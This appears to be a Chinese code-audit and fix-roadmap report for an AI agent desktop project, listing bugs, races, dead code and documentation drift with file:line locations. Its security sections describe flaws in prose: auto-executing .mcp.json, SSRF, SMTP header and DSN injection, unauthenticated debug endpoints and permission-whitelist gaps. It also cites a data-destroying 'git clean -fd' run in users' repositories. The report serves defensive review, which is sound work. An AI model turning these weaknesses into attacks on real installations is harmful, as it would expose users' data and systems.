| F1 | `components/cowork/GraphCanvas.tsx:133-148` | 知识库为空时伪造 251 节点+350 边的"mock"图（非空判断分支使 ragGraphEmpty 空态永不可达）；mock 节点缺 `label` 字段 → 搜索时 `n.label.toLowerCase()` TypeError | 空知识库显示假数据；一搜索**图谱视图崩溃**【已验证】 | 删 mock 块落空态；如需保留放 dev flag 后 |
| F2 | `layouts/NetDevLayout.tsx:688-734,775-788` | 两个并挂的 keydown 监听都处理 `r` 和 `/` | 每次按键 `reload()` 双触发——设置/finding/提案/审计/切换全量请求**翻倍风暴** | 删除旧监听，合并快捷键 |
| F3 | `components/netdev/LogPanel.tsx` | `stopFollow` 只在设备/类型切换与手动开关时调用，**无 unmount 清理** | 离开日志页后后端 follow 会话持续泄漏推流；重进显示未跟随实际在跑 | 增加 unmount cleanup effect |
| F4 | `App.tsx:2834-2841` + `lib/keyboardShortcuts.ts:17-25` | 字号 ±/reset 与 暂停/恢复 4 个全局快捷键注册了 handler 但 DEFAULT_BINDINGS 无对应键位 → 静默无绑定 | 用户以为有快捷键实际没有 | 补键位或删死调用 |

（P2 级补充：`App.tsx:2062` QueuedMessages 1.5s 永续轮询（节流 ref 死代码）；`App.tsx:2842` paletteItems 漏 `netdevActive` 依赖；`OverviewPanel` briefState 用局部变量当状态——反馈永不显示；`AlertSetupWizard` 把 i18n key 当规则名持久化并进 Go Finding 文案；`SecWorkbench` UTC 时间戳直切字符串（UTC+8 差 8h）；`CutoverBoardView` 缺 `ndv.cut.st.precheck-failed` key 渲染原文；`SrvConfCard` select 值与 input 展示不一致；`NetDevSection` 重命名实体变复制；`TerminalPanel` 按"running 标志"路由事件 → agent bash 输出串进用户终端页；备份 diff 方向两个组件相反；`usePanelData`/`ChainBoard` 无乱序守卫；硬编码中文绕过 i18n 遍布（SkillSelectModal 整组件、ImportModal 整组件、DockTabs、entityTypes、DocPreview、Transcript 重试按钮等）；`ProposalCenter.tsx:215` `t("ndv.prop.empty")` 当字面文本渲染。）

---

## 3. P2 汇总（精选 40+，按主题）

**并发/资源**（第 2 轮横切新增为主）
- `browser.go:3946` `s.ctx/s.ctxCancel` 写持 tabMu、~41 处读不持——接口值撕裂/操作死 tab（与横切 pass 交叉确认）。
- `boot.go:664-1182` 每次 `Build`（每次设置保存/配置切换）重写 `builtin` 包级全局（browserAutoRT/globalBrowserLaunch/postEditHook/vlm 模型串）无同步，与在飞工具 goroutine 竞争。
- `uitree_windows.go:60/uiauto_windows.go:139` 每调用 `syscall.NewCallback`——约 2000 次后进程级 fatal；长时间桌面自动化必踩。
- `uia_windows.go:239` `unpackRect` 把未验证 VARIANT 值当指针解引用；`:180` COM 元素 `Release()` 后再用。
- `controller.go` Close vs follow-up、NewSession TOCTOU（见 A6/A7）；`rag_app.go:398` HE 富集 wave 无取消/无重入/关店竞写；`he_service.go:150` monitor 裸读 s.cmd。
- `scheduler.go:756` 空 if 块死代码；`expr.go:445` 损坏 cron 静默回退 now+1h 继续开火。
- `checkpoint` 非原子（见 S8）；`config` 非原子（见 C4）；netdev 全家族状态存储裸 `os.WriteFile`（cutover/proposal/finding/backup/cases/cve/discovered/discoveryrun/golden/job——crash 即截断且 audit 关键时刻丢档）。
- `remote_ssh.go:356` 上传 ssh.Session 成功路径不 Close。
- `agent/interceptors`、`dream.go:514`（SpawnDream 忽略传入 ctx——停止按钮/关机无法取消，Close 5 秒放弃后孤儿运行）。
- `netdev/transport/client.go:192` ExecInput 取消后 goroutine+SSH channel 永久滞留。

**安全**
- `.mcp.json` 自动执行（C3）；`imagegen.go:120` 对 API 返回 URL 无 SSRF 防护直取（对比 webfetch/installsource 有防护）；`remotehost/host.go:178` 预鉴权无界行读；`feishu.go:388` 重放+非常量时间比较；`mobilebridge_app.go:366` file_chunk 无总量上限（盘满 DoS）；`dbquery.go:190,203` DSN 字符串拼接可被 password 注入重定向主机 + pg `sslmode=prefer` 明文回退；`desktop/remote_server.go:122` TOFU 无提示 + 明文 token。

**逻辑/边界**
- `webfetch.go:73` `ips[0]` 空结果 panic；`browserconsole.go:976` scroll "screens" 传入像素参数（3px）；`notebookedit.go:116` Preview 绕过 confine（审批前外读）；`browsersnapshot.go:147` 全局 refSeq 并发重置 → ref 撞车点错元素；`ls.go:79` 单个不可读目录整树失败；`calendar.go:356` `e.ID[:12]` 短 ID panic；`email.go:279` SMTP 头注入；`assess/dashboards/handoff` 等 netdev 状态语义（见 2.3 P2 补充）。
- openai/anthropic 细节：thinking/effort 不校验；多模态消息重排丢失交错；`StreamInterruptedError` 缺失。
- `frontmatter`/`mcpjson`/`ccswitch` 导入链缺校验。

**前端**
- i18n 硬编码（约 94 文件含非 locale 中文；en/zh 静态 key 4210↔4210 完全对齐——漏洞全在硬编码字面量）；`SkillSelectModal`/`ImportModal`/`DockTabs`/`entityTypes`/`DocPreview`/`loopPresets`(labelEn 死字段) 等；`t(...) as never` 动态 key 逃逸类型检查（正是 F 系列 key 缺失溜过的原因）。
- 数据处理：`VulnScanPanel` Invalid Date 渲染 NaN；`LogWorkbench` syslog 年份假设；`ChainBoard/recordTrace` slice 切 surrogate pair。

---

## 4. P3 汇总（~90 项，此处列代表性清单）

- **UTF-8 按字节截断**（CJK 乱码）共 20+ 处新增点位：`rag/llm_semantic.go:206`、`browserdevtools.go:100,110`、`controller.go:616`（truncateForNotice）、`installsource/skill_market.go:138,180`、`netdev/notify.go:180`、`bot/netdevcmds.go:131`、`tools.go:837`、`selfexport.go:51`、`glob`/`docxwrite` CSV 对齐/`markdownToHTML` 无 HTML 转义等。统一修法：共享 `truncateRunes(s,n)` 助手（仓库已有 `truncateRunes`，未推广）。
- **死代码清单**（合并去重，删除或接线；已经第 7 轮逐条 grep 验证调用方）：`agent/max_mode.go` 整文件（RunMaxStep 无调用方）、`parallel_tasks.go`（未注册且 ReadOnly 误标——一旦注册即 plan 模式写穿透）、`crashrecovery.go`（spec 5-2 从未接线）、`worktree.go`（见 A4）、`event/snapshot.go`、`items.go` 双轨、`reasoning_language.go`、~~`compact.go` SummarizeFrom/UpTo/CompactNow~~【第 7 轮证伪：三者均有完整生产调用链（CLI rewind / serve / remotehost / desktop 远程会话），**不可删**】、~~`runtime/uv_install.go` Install 无调用方~~【第 7 轮证伪：boot.go:1015-1024 在 ResolveUV 失败时后台调用 Install——自动下载**已接线**；仍成立的只有 sha256Hex 死函数与"下载后未做 SHA256 校验"的供应链缺口】、`desktop/TabBar.tsx`(311 行)、`ShortcutComboDisplay`、`browser.go` 页面停滞检测（recordPageState nolint:unused——nudge 分支永不可达）、`newBrowserSessionEphemeral`、`fieldSuffix`、`edit_fuzzy` normalizeIndent 等、`glob doubleStarMatch*`（仅测试调用——测试给假信心）、`netdev` dbMSSQLDSN/sortedPorts/kindDocker（~~isProjectFile~~ 有生产调用点 auditproject.go:124，非死代码）、`desktop` netdevFollowOnce/add-take maps/sortRagNodes/PromoteMemory/RejectMemory 永久 no-op、`heHealthCheckPeriod/browserUseHealthCheckPeriod` 常量、`linkpeersignal` hashID、`mobilebridge/upnp.go` 整文件。路径勘误：窗口置顶死常量在 `builtin/window_windows.go`（非 desktop/）、formatPriorRounds 在 `experts/orchestrator.go`（非 agent/）。
- **Windows 专项**：`bash_kill_windows.go:28` reapTree 无操作（需 Job Object）；`capture_darwin/linux` 固定 /tmp 文件名并发冲突；`pty_windows.go:358` 注释与实际阻塞行为不符。
- **杂项**：`tools.go:307` 拒绝文案"（变更变更）"错字；`template.go:203` "variable{{s}}"；`syslogrecv.go:47` "line protocol" 同时命中 up/down；`snmp.go:94` community 静默回退 public；`netconf.go:38` allowlist 死逻辑 + `clock/block` 误拒；`redact` 阈值大小写未归一；`notify.go:190` Subject 无 CR/LF 消毒；`series.go:55` quoteJSON 不转义控制字符 → JSONL 永久跳行；`journal.go` R2/R3 无老化无界增长；`escalatedIDs` 无界；`mobilebridge/pairing.go:564` pending 无过期；`signal_client.go:112` 重连退避不重置。

---

## 5. 功能缺失清单（Incomplete Features Inventory，合并去重）

**文档承诺但未实现/已腐烂（用户可感知）**
1. README 三个 CLI 子命令不存在：`fairpeer goal`（只有 `/goal` 斜杠命令）、`fairpeer team review`（无 team 子命令）、`fairpeer skill list/install/new`（无 skill 子命令）。
2. 两篇文档教 `make build/test/vet…`（README_cn.md:133、CONTRIBUTING.md:92-97）—— **仓库无 Makefile**（第 7 轮核实：SPEC.md 实际不含 make 引用，原"三篇"计入有误）。
3. GUIDE.md：`[[cowork.schedules]]` TOML 模式不存在（代码走 scheduler 工具）；`[[cowork.email_accounts]]` 平铺 schema 与真实嵌套 schema（config.go:660）不符——按文档写**静默无效**（example.toml 写法正确，GUIDE 错）。
4. IMPROVEMENT_PLAN §2.2.1 skill 市场：**部分实现**（第 7 轮修正：`skill_market` 工具的 browse/search/install 已存在且已接线；缺的是 publish/update、skills.fairpeer.dev registry API、签名、以及 README 承诺的 `fairpeer skill` CLI）；§2.1.1 `[tools.officecli]` config key 无人读取（已核实 ToolsConfig 仅 3 字段）。
5. MODEL_REGISTRY_PLAN 的 `[desktop] registry_url/registry_ttl_hours` config key 未读取（TTL 硬编码 12h，desktop/registry.go:31）。

**代码内自认的桩/半成品**
6. `screen_perceive_windows.go:149` UIA 失败回退 stub（非 Windows 版本存在）。
7. `screen_perceive_windows.go:113` VLM choice 计算后丢弃——工具一半功能没交付。
8. MCP HTTP OAuth（PKCE 全套 + tokenStore）零接线。
9. `mobilebridge`：`Answer` TODO 未接（手机无法回答 ask 提问）；ping/pong/switch_tab 声明为 no-op；UPnP 死代码；QQ 会话恢复字段齐备但未实现；`seenCmdIDs` 满千清空重开重放窗。
10. netdev：SFTP 子系统 v1 靠 cat/ls 充当；串口控制台非 Windows stub；日志跟随走串口被拒；winevt 未进 sweep；升级链 stage2 未做；netprobe 自动部署未做；series sqlite 化未做；`CleanupSeries` 无调用方。
11. desktop：`LoopConfig.StartAt` 接受持久化但从不消费；`LoopConfig.MaxTokens` 半接线；`officialProviderTemplate` 恒报"无模板"；专家页签关闭不取消运行（cancelExpertRunByTab 从未被调——关页签后 orchestrator 继续烧 token）；`TrashExpertSession` 对真专家页签 topicID 恒空存疑。
12. 前端：ShortcutsCheatsheet 是 11 行空壳（~30 个 locale key 已备好未用）；`registerShortcut/unregisterShortcut` 空占位；`composerHistory.clearHistory` 零调用；编辑器 Monaco 换肤接缝只有注释；`CodeMirrorCode` 硬编码 dark 主题。

**测试盲区**（零测试包）：`internal/apihelper`、`internal/browseruse`、`internal/remotehost`（**安全敏感的远程文件/协议层零测试**）；`netdev/driver`、`trustdomain/nettrans` 覆盖稀薄。CI（ci.yml）**不跑 `go vet` 也不跑 `-race`**——上述并发类问题全部无法在合并前暴露。

---

## 6. 文档漂移与仓库卫生

1. **版本四方不一致**：README 徽章 v0.1.5、README_cn 徽章+正文 v0.1.0、CHANGELOG 最新 `[0.1.10]`（且该 header **重复出现两次** :1147/:1164）、代码 `var version="dev"` 由 ldflags 注入——无单一事实源。
2. README_cn 称 Go 1.25+，go.mod 实为 `go 1.26`（1.25 无法构建）；CONTRIBUTING 引用不存在的 `internal/inspect` 与 `workers/crash-report/`；SPEC.md §1.3 "唯一外部依赖是 TOML 库" vs go.mod ~40 个直接依赖（原则早已放弃但契约文档未改——而 SPEC §1 自己规定改实现前须先改该文档）。
3. 计数漂移：README 18 vendors vs registry 26 模板（registry 中 bailian/siliconflow/openrouter/xai/ollama 等 8 个未进 README 表）；SKILL_SPEC "15 内置" vs 实际 23（rag-auto 已改名 knowledge-auto，roster 24）；NETDEV_USAGE "十二件套" vs 实际 24 个常规注册 + 2 个信任域条件启用（fleet/remote）。
4. **git 追踪了 6 个 .exe 二进制**（context-maintenance-e2e/cua-replay/e2ebench/fairpeer-plugin-example/desktop/test/spike sttspike）与 `gui-test-screenshots/` 57 张开发截图；根目录散落未文档化 Python 服务脚本与 `debug_signal.toml`。根 `package.json`（仅 playwright-core）与前端模块脱节。
5. 积极面（核实无误）：`.gitignore` 维护良好（fairpeer.exe/cover.out/nul 等在盘但未追踪）；`fairpeer.example.toml` 抽查 10 字段与 config.go 完全一致；NETDEV_USAGE §六"还不存在的"诚实清单与代码一致；MODEL_REGISTRY_PLAN、fairpeer_vs_pi、COWORK 安全计划、LinkPeer M0-M3 的"已完成"声明经代码核实**属实**。Go 源零 FIXME/XXX/HACK。

---

## 7. 修复路线图（6 个批次）

> 原则：先堵安全与崩溃，再修静默数据丢失，再修功能性死代码，最后卫生与文档。每批次含验收标准；全部改动的回归防线见 §8。
>
> **进度（2026-09-06）：批次 1、批次 2 已完成。**
> 批次 1——P0-1 白名单收紧+70 用例矩阵、P0-2 repeatMu+并发回归测试、P0-3 review 默认+入组消息不执行+群门+admin 门（含 render.go 补 mode/telegram/admin 字段防丢配置）、P0-4 hooks 顺序。验收：permission/bot/config/agent 测试全绿、go vet 干净、tsc --noEmit 0 错误。
> 批次 2——① 原子写全家桶：config.WriteFile+migrate、checkpoint.persist、netdev 12 文件 20 处（后台 agent 扫荡+TestSaveCutoverAtomicConcurrentReads）；② C1 render.go 补齐 llm.tpm/reserve_main、dream 两字段、cowork 15 字段、bot.desktop_watchers、session_mappings chat 字段 + round-trip 守卫测试扩至全部曾丢字段；③ C3 .mcp.json 条目强制 auto_start=false（克隆仓库不再启动即执行，用户经 MCP 管理器 opt-in 持久化到 TOML）；④ S1/S2 serve：Host 守卫（防 DNS rebinding）+32MiB 体限+Run 超时+/resume 目录约束；⑤ T2 untrusted 围栏改原串正则替换（Unicode 偏移漂移修复+幂等性测试）；⑥ S7 @import 限制在 baseDir 子树（~、绝对路径、../ 全阻断）；⑦ T7 rag_mindmap 加 roots/confine（RAGTools 签名+ConfineWriters 双保险）；⑧ N8 validStoreID 应用于 srvconf/template/proposal/backup；⑨ N15 审计命令中心化 Redact；⑩ B1 mobilebridge 假 Unlock、B2 wss 保留、B3 nettrans 越界守卫、B6 XFF 取最右+net.ParseIP 私网判定。验收：go build ./... 通过、涉改 9 包测试全绿（netdev 262 用例 -count=1 通过）、go vet 干净（screen_windows/uia 的 unsafe 警告为审计 T1 既有项，批次 5 范围）。
> 遗留：netdev 还有 10 个文件的非状态类裸写（briefing/auditproject/humantty/journal/series/topoimport/template/srvconf/selfimport/knownhosts——多为 jsonl 追加与一次性产物，危害低）可随批次 4 顺带处理。-race 仍待 CI。
>
> **进度（2026-09-06 续）：批次 3、4、5、6 已完成——路线图全部落地。**
> 批次 3（agent/会话正确性，4 并行 agent 25 项）——A1 截断拦截器先落 assistant 消息再落 skip 结果（孤儿 tool 修复）；A2 ItemAdapter 全程持锁（Reset 拆 locked 防自死锁）；A3 compact/SummarizeFrom/UpTo 改 Snapshot() 快照读；A5 checkpoint TruncateFrom + sort.SliceStable + Rewind 接线 + KeepCurrent 单临界区；A7 NewSession/ClearSession 二段复检 c.running；A8 HMAC 换 crypto/rand；A9 dream 下钻一层子目录；eventwire 增 FromWireOK 丢弃信号；ChunkToolCall nil 守卫。desktop：D1 DeleteTopic 传 profileKey + TrashTopic 先删主题；D2 loop 回滚改 git stash create/read-tree 快照方案（用户未提交改动保留，端到端验证）；D6 SetDefaultModel 持 a.mu；D7 expert tab nil 安全；D8 LoopStart CAS + 所有权校验清理；D9 SaveExportFile 一次性 pick 白名单；withActiveWorkspaceDo 全程串行化。rag/scheduler/sandbox：S3 重命名去掉 rag_chunks；S4 空向量跳过；S5 in-flight 防双跑 + cron 24h 窗口求值封顶 + 高频确认门实现 + every 解析失败退避 1h；S6 非 darwin RequireAvailable fail-closed（拒绝脚本 argv，避免 bash.go 索引 panic）。
> 批次 4（netdev 可信度，2 并行 agent 26 项）——N1 slowlog 守卫；N2 done→watching 激活（观察期管线全部接通，rollback 接受 watching）；N3 步内 AppliedCmds 前缀回滚（SQL 标注语句位置）；N5 传输错误不再误 resolve（结论未知路径）；N8/N14/证书 absent 标记改 JSON 编码兼容旧格式；提案 ID 日内重启续号；stale executing 懒恢复为 partial；N4 locate 无条件解析；N9 ls -ld；N10 GPU nounits+按列；N6 syslog 关→开可重启用；N7 trap 按设备 community 校验；N11 时间窗取反修复；N12 失败 run 落盘 failed；其余 P2（pauseReq Once/logfollow nil 通道/finding 先写后通知/handoff 按 Status/timeline 全设备合并/auditproject green/dashboards fi nil/discovered 防穿越/humantty 解码锁）+ 10 文件残余原子写。
> 批次 5（工具/provider/前端，3 并行 agent 42 项）——T1 SendInput x64 联合体 offset 8 布局重建（wire 布局测试）；T3 截图区域钳制到虚拟屏；edit_fuzzy 行边界锚定（中行匹配拒绝）+ 空白中间块锚 100 行间隙上限（两个数据损毁级修复）；apply_patch 同路径 move 拒绝+回滚保护既有目标；browserflow type 步 ref/selector 映射；docx `<w:p/>` 计数对齐；SSE 握手 endpointReady 阻塞等待（顺带修 event 名 trim + result 解包两个潜伏 bug）；CallTimeout 全传输生效；readBoundedLine 流式截断；vision 关闭剥离图片；temperature=0 可表达（TemperatureExplicit）；schema strict 兼容性探测；MCP 非文本块标记；frontmatter 多行块标量。前端 20 项：GraphCanvas mock 删除、useToast 提升、空按钮、双键盘监听、LogPanel unmount 停流、快捷键绑定补齐（ctrl+=/-/0、ctrl+shift+p）、briefState useState、告警名 t()、UTC 时间本地渲染、kebab 状态键、重命名按原名替换、终端按 shell- id 路由、备份 diff 排序、乱序守卫、SettingsPanel 全部 .catch + 16 处 commitDraft 出 updater、CoworkDock n.collection、空闲停轮询、palette 依赖、ProposalCenter 花括号。
> 批次 6（死代码+卫生）——删除 5 个零引用整文件（agent/max_mode.go、parallel_tasks.go、crashrecovery.go、event/snapshot.go、mobilebridge/upnp.go，第 7 轮 grep 验证零外部引用+无专属测试）；README 三个幻影 CLI 命令改写为 /goal、fairpeer review、/skills；GUIDE 邮箱嵌套 schema+schedules 改为运行时工具说明；SPEC 依赖契约更新+目录树 Makefile 幻影行移除；CONTRIBUTING 幽灵路径标注+Go 1.26；厂商数 18→26、技能 15→23、netdev 12→24；版本徽章统一 v0.1.10；CHANGELOG 重复合并；**新增 Makefile**（build/test/vet/fmt/hooks/cross/frontend）；wails.json 输出名对齐 fairpeer-desktop；git 取消追踪 6 个 .exe+gui-test-screenshots 并补 .gitignore；**CI 新增 quality job（go vet + go test -race 双模块 + 前端 tsc）**——§8-1 治本建议落地，此前所有并发类 bug 均无法被旧 CI 拦截的问题就此关闭。
> 总验收（2026-09-06）：root+desktop 双模块 `go build ./...` 通过；`go vet ./internal/...` 干净（screen_windows/uia 的 unsafe 警告为既有基线）；**27 个涉改包 `go test -count=1` 全绿**（netdev 287s/262+ 用例、tool/builtin 113s、desktop 38s）；前端 `tsc --noEmit` 0 错误、vitest 43/43。累计新增回归测试 60+。符号级死代码（browser recordPageState、edit_fuzzy 助手、netdev 散落符号等 ~30 处）经评估保留——零风险但删除收益低，留待专门清理 PR；spec §10.4/§5 清单已标注状态。

**批次 1 —— P0 止血（≤1 天）**
1. P0-1 权限白名单收紧（env/find -fprint/git tag/reflog）+ 元执行器单测矩阵。
2. P0-2 `repeatSuccessCounts` 加锁。
3. P0-3 bot 白名单默认 review + 敏感命令 admin 门 + 群白名单强制。
4. P0-4 AgentDashboard hooks 顺序。
- 验收：新增单测全绿；`go test -race ./internal/agent ./internal/permission ./internal/bot` 通过；Ctrl+I 手工冒烟。

**批次 2 —— 数据损毁与安全主路径（1 周）**
1. 原子写全家桶：C4（config.WriteFile）、S8（checkpoint）、netdev 15 个存储点、migrate 路径 → 统一 `fileutil.AtomicWriteFile`。
2. C1 配置渲染器丢字段（影响面最广的静默丢失）+ 渲染↔解码一致性守卫测试。
3. C3 `.mcp.json` 首次确认门；S1/S2 serve Host 校验+体限+超时；S7 memory @import 限制相对路径；T2 untrusted 围栏偏移修复（注入防线）+ToLower 字符集单测；N8/T7 路径消毒；N15 审计文本 Redact。
4. B1/B2/B3/B6 网络面崩溃与降级修复。
- 验收：每个修复点带负路径单测；`go vet` 零新增。

**批次 3 —— agent/会话正确性（1 周）**
1. A1 孤儿 tool 结果、A2 ItemAdapter 加锁、A3 /compact 竞争、A6/A7 生命周期竞争。
2. A5 checkpoint TruncateFrom；A8 HMAC 换 crypto/rand。
3. S3 rag 重命名、S4 向量错位 panic、S5 调度器双跑+cron 上限、S6 沙箱 fail-open。
4. D1/D2/D6/D7（桌面崩溃与数据清除）。
- 验收：`go test -race ./...` 全绿；回退→恢复确定性回归测试（A5）。

**批次 4 —— netdev 可信度（1-2 周）**
1. N1 panic、N3 半步回滚、N5 弱口令误 resolve、N2 观察期激活、N14 partial 保护。
2. N4/N9/N10 三个"静默永不触发"探测特性修复；N6/N7 syslog/trap 生命周期与鉴权。
3. N11-N13、N15 及 P2 补充清单。
- 验收：netdev 242 个既有测试全绿 + 新增场景测试；靶场端到端冒烟。

**批次 5 —— 工具与 provider（1 周）**
1. T1 Win32 INPUT 偏移（桌面自动化从"全坏"变"全好"）、T3 OOM 钳制、T4/T5/T6/T8。
2. C2 SSE 启动、C5/C6 provider 契约、C7 frontmatter 多行、C8 非文本内容标记、CallTimeout 全传输生效。
3. P2 前端批次（F2/F3 双监听与泄漏、GraphCanvas 崩溃、乱序守卫、时间戳时区）。
- 验收：browser flow 录制回放端到端用例；SSE MCP 集成测试。

**批次 6 —— 死代码裁决 + 文档/卫生（持续）**
1. §5 清单逐项 triage：删除 / 接线 / 显式标记 "planned"（每项一行记录到 CHANGELOG）。
2. README 三命令改写、Makefile 落地或删文档、GUIDE 两处 TOML 修正、版本徽章单一事实源（build ldflags + CI 校验脚本）、CHANGELOG 重复合并、CONTRIBUTING/SPEC 契约更新。
3. `git rm` 6 个 exe 与截图目录；Python 脚本移 scripts/ 并补 README。
4. 文档计数刷新（18→26 vendors、15→23 skills、12→26 tools）或改为"以 `--version`/`doctor` 输出为准"。

---

## 8. 防回归基建建议（治本）

1. **CI 加 `go vet ./...` + `go test -race ./...`**（当前两者皆无——本次全部并发发现均不可被现有 CI 拦截）。前端加 `tsc --noEmit` 严格模式 + 自定义 lint 禁 `t(x as never)`（F 系列键缺失的根源）。
2. **panic 边界**：所有 agent 工具 Execute、Wails 绑定方法、nettrans/serve handler 顶部 recover→结构化错误（本次 4 个进程级 panic 全在这三类边界）。
3. **渲染↔解码一致性**：config render 改 toml.Encoder 后，加"round-trip 相等"测试（Default→Render→Decode→Render 逐字节相等）。
4. **权限矩阵测试**：`bash_readonly` 白名单每个命令 × 危险参数形状的表格测试（元执行器、find 谓词、git 写子命令）。
5. **原子写 lint**：自写检查禁止对状态存储直接 `os.WriteFile`（白名单 fileutil）。
6. **截断助手**：全仓库替换字节截断为 `truncateRunes`，lint 禁止 `s[:n]` 数字字面量模式。
7. **测试补盲**：`remotehost`（安全面）、`browseruse`（协议契约）、`apihelper` 三个零测试包补齐。

---

## 9. 覆盖声明与残留盲区（第 3 轮时点，已被第 4/5 轮基本消除）

- 第 4 轮已补齐：internal/cli 其余 49 文件、trustdomain 非 nettrans、netdev/driver+transport、lsp/acp/calendar/evidence/installsource/linkpeersignal 尾部、desktop 全部平台 shim 与 cmd 次级工具、根目录 Python/脚本、前端其余 75 文件。
- 仍非逐字全文（结构/入口已核，解析体仅概览或低风险）：`internal/rag/officedoc.go`、`rag/templates.go`、`rag/community.go`（Louvain 二段）、`internal/control/auto_plan_classifier.go`、`internal/memory/presets.go`（共约 1800 行）；前端 `components/mermaidLogic.ts` 尾部（有测试覆盖）、`entityTypes.ts` 尾部调色板常量；`spike/stt` 正文；全部 `*_test.go`（557 个文件按需抽读）。
- 所有 file:line 基于 2026-09-05/06 工作区状态（含未提交改动）；合入新代码后需按行号重新定位。

---

## 10. 第 4 轮补充发现（盲区全覆盖）

### 10.1 新增 P1（9 项）

| # | 位置 | 问题 | 影响 | 修复 |
|---|---|---|---|---|
| R4-1 | `internal/cli/mcp_manager_view.go:19-35` | 【第 6 轮降级：P1→P3 潜在隐患】`render()` 缺 `mcpStageMode` 分支属实，但**该 stage 不可达**——`mcpActionMode` 从未被任何 actions 列表追加（`mcpActionsFor`/`appendMCP*` 均无），用户菜单里不存在"连接模式"入口。是死代码地雷（一旦有人接线菜单即触发），而非用户可遇到的 bug | 界面回落列表 + 不可见 tier 选择器的风险仅在将来接线后成立 | 补渲染分支，或删掉 mcpStageMode 死路径 |
| R4-2 | `internal/cli/chat_tui.go:1863-1877` | `shellTranscriptIdx` 对**所有**工具都写入，但 `shellOutputs` 只有 shell 命令；Ctrl+B 取 max-idx 条目后查不到即静默返回 | 任何非 shell 工具运行过后，Ctrl+B 查看 shell 输出**永久失效** | 扫描时跳过无 "shell-" 前缀的 id |
| R4-3 | `internal/trustdomain/sync.go:110-122`（连带 nettrans/join.go:115、store.go:83） | `ValidateChain(空切片)` 返回空 Chain + nil err，`DomainID` 取 `hashes[0]` → **网络可达的 index panic**（peer 回空 blocks 即崩节点；损坏的 ledger 文件同理） | 已认证 peer / 损坏文件可崩掉信任域节点 | ValidateChain 对零区块返回错误；DomainID/Head/Height 判空 |
| R4-4 | `internal/trustdomain/nettrans/discovery.go:143-162` | `ListenBeacons` goroutine 读 `node.Chain()`/`State()`，与主循环 `Tick()`（改 chain/state）并发——Chain/Node 明文标注"单 goroutine 设计"却有三处并发访问 | 数据竞争 → 撕裂读 / concurrent map fatal | Node 提供 mutex 保护的快照访问器，beacon 循环只拿不可变快照 |
| R4-5 | `internal/installsource/marketplace.go:146` + `clawhub.go:121` + `plan.go:36` | ClawHub 安装链接（`/api/v1/skills/<slug>/file?path=SKILL.md`）在 `planURL` 所有分支都不命中 → `ErrUnsupportedKind` | **ClawHub 市场的安装功能完全不可用**（目录/搜索正常，装不上） | planURL 识别 ClawHub file 端点走下载分支，或 InstallRef 改为可直取的 SKILL.md URL |
| R4-6 | `desktop/updater.go:282-311` | Windows 自更新把下载的 NSIS 安装器 `move` **覆盖正在运行的 fairpeer.exe** 再启动；`installerCommand`（/D= 静默安装、钉住安装目录）是死代码；用户取消向导 = 磁盘上没有 fairpeer 了 | 更新失败即应用消失；三套互相矛盾的更新实现并存 | 恢复设计意图：写临时文件 → `installerCommand` 启动 NSIS；删除 move-over-replace 路径 |
| R4-7 | `ocr_pdf.py:189` | `_ocr_page` 定义 3 参、调用传 4 参 → 每个扫描页 `TypeError`，被 `except Exception` 吞掉输出占位符 | **扫描版 PDF 的 OCR 核心功能从未工作过**且静默失败 | 去掉多余的 lang 实参；顺带适配 PaddleOCR ≥3.x |
| R4-8 | `desktop/frontend/src/components/CapabilitiesPanel.tsx:203` | `useToast()`（基于 useContext）在 async 事件回调里调用 = **无效 hook 调用** | 用户一点"粘贴导入 MCP JSON"即抛 "Invalid hook call" → 全局崩溃覆盖层 | 把 `const { showToast } = useToast()` 提升到组件体 |
| R4-9 | `desktop/frontend/src/components/MemoryPanel.tsx:998-1003` | "添加记忆"卡片的提交按钮**内容为空**（文案丢失） | 设置→记忆的添加表单只有一个无字空按钮 | 补 `{t("memory.remember")}` |

### 10.2 新增 P2（精选 26 项）

**cli**：`chat_tui.go:1437` bottomRows 不计队列指示条 → 排队反馈时底部溢出屏幕；`chat_tui.go:1042` 排队插话把粘贴占位符原文发给模型（`pastedBlocks` 被提前清空）；`mcp_manager.go:154` "r" 热刷新漏 `clamp()` → 快照缩小时 index panic；`chat_tui.go:1867` /clear 后 `shellTranscriptIdx` 未清 → Ctrl+B 覆盖新 transcript 任意行；`rewind.go:157` 回退列表无窗口化，百回合会话视口坍缩。

**trustdomain/远端**：`sync.go:130` Sight 视图对**校验失败**的 gossip 区块照样折叠撤销记录——任意 peer 可永久"撤销"任意成员（DoS 向）；`state.go:380` 非管理员发 token 也刷新 dead-man 时钟 → 管理员密钥全丢后域**永不可恢复**（违背 §13.2）；`driver/driver.go:167` `[netdev.extra_read]` 对 6 个驱动中 5 个无效（只有 zte 设了 driverKey）—— advertised 的知识增长路径是空操作；`remotehost/host.go:334` session/new TOCTOU 泄漏控制器 + `s.ctrl/s.approve/s.answer` 跨 goroutine 裸写；`remotehost/host.go:154` 预鉴权无上限读 + 无限速（token 可暴力）。

**desktop/cmd**：`e2ebench/diff.go:147` 在**用户仓库**跑 `git clean -fd`（重复的 `-e fairpeer.toml` 说明丢了第二个排除项）——本地跑基准会删光未跟踪文件；`screenshot_hotkey_linux.go:91` `xset q` 输出根本不含按键状态 → Linux 截图热键永不触发但 10Hz 永久起子进程；`screenshot_hotkey_darwin.go:79` 主键被丢弃、**只按修饰键就触发截图+VLM**（打大写字母即拍照）；`linkpeer-debug-server/main.go:191` /qr 无鉴权绑 0.0.0.0 + 自动确认配对 + 读写模式；`tray.go:46` tray 项指针无锁写/持锁读竞争；`cua-replay/main.go:58` 文档承诺的 `-base`/provider 解析不存在。

**前端**：`SettingsPanel.tsx:415,1745,1772,1777` MobileSection confirm/reject、bot 安装轮询、诊断、测试连接均无 `.catch` → 一次瞬时失败即触发全局崩溃覆盖层（`crash.ts` 对 unhandledrejection 全屏渲染）；`CapabilitiesPanel.tsx:199` 用原生 `window.prompt` 导入多行 JSON（Wails WebView2 下不可用）；`MemoryPanel.tsx:374+649` 记忆列表渲染**两遍**（疑似半截重构残留）；`CoworkDock.tsx:1369` 全集合视图下 extract/remove 用空的 `activeCollection` 调后端；`SettingsPanel.tsx:1570` `setDraft` updater 内调 `commitDraft` → StrictMode 下**每个检测/模板/账户操作双写后端**（同文件 ：4735 注释自己写明了这个坑）；`SettingsPanel.tsx:373` 成功消息渲染进红色错误横幅。

### 10.3 新增 P3（~40 项，摘要）

